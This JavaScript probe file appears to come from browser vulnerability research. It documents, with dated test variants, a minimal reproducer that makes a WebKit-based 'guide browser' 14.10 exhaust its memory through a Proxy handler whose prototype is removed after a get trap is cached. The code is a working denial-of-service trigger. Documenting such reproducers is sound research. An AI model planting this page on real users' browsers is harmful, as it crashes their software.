// CRASH_CLASS: MODERATE
// PROBE 173: a page that exhausts the guide browser's memory in one call
//
// Context: p172 replays WebKit's own regression cases against the 14.10
// engine. Case 296 (`proxy-handler-traps-cache-poly-proto-handler.js`) stopped
// the run at the same index in every attempt, and the last of those attempts
// loaded that case alone, in its own document, from a fresh guide process: the
// console answered "there is not enough free system memory". The engine was
// cut at Safari 17.0, and this case was written for a fix after that point, so
// the code path it exercises is the one that behaves differently here.
//
// Six variants then cut the case down. Each one ran in its own document, in
// this order, on 2026-10-21 at 18:04 UTC (session sunejr):
//
//   var-v6-helper-control   poly-proto helper alone                          OK
//   var-v1-proxy-get        + new Proxy with a get trap                      OK
//   var-v2-proto-null       + setPrototypeOf(handler, null), then a read     DIED
//
// and four controls at 18:06 UTC (session yh77dd) that all completed:
//
//   var-w1-to-object        the prototype becomes {} instead of null         OK
//   var-w2-null-before      null set before any trap was cached              OK
//   var-w3-plain-handler    an ordinary handler object, not poly-proto       OK
//   var-w4-null-no-read     null set, nothing read through the Proxy after   OK
//
// So the failure needs all four ingredients: a poly-proto handler, a cached
// get trap, a prototype removed after the trap was cached, and a read through
// the Proxy afterwards. The effect is memory exhaustion, not a wrong value and
// not a crash: the case's own assertions never get to run, and the browser
// reports its out-of-memory notice about a second after the page loads.
//
// This probe is the minimal reproducer on its own. Loading it in the guide
// browser exhausts the WebProcess memory; it does not touch the kernel and it
// is not an escape from the browser sandbox. What it does establish is that a
// single page can end the browser process on 14.10 through a JavaScript
// construct the engine is supposed to handle - the shape of an engine bug, not
// of a sandbox issue.
//
// Beacon protocol: `P173-START` before the trigger and `P173-SURVIVED` after
// it. The second marker is the one that matters: if the log shows START and no
// SURVIVED, the engine died inside those twelve lines.

(function () {
  function mark(tag) {
    var url = location.origin + '/beacon/P173-' + tag + '?t=' + Date.now();
    try { if (navigator.sendBeacon && navigator.sendBeacon(url)) return; } catch (e) {}
    try { var x = new XMLHttpRequest(); x.open('GET', url, true); x.send(); } catch (e) {}
  }

  // A poly-proto object: enough instances of the class that the engine stores
  // the prototype in the object instead of in its structure.
  function makePolyProtoObject() {
    function foo() {
      class C {
        constructor() { this._field = 42; }
      }
      return new C;
    }
    for (var i = 0; i < 15; ++i) foo();
    return foo();
  }

  mark('START');

  var handler = makePolyProtoObject();
  Object.setPrototypeOf(handler, Object.prototype);
  handler.get = function (target, key) { return 'got ' + key; };

  var proxy = new Proxy({}, handler);
  proxy.foo;                        // the trap is cached against the handler

  Object.setPrototypeOf(handler, null);   // the prototype the cache trusted is gone
  proxy.foo;                        // and this read does not come back

  mark('SURVIVED');
})();
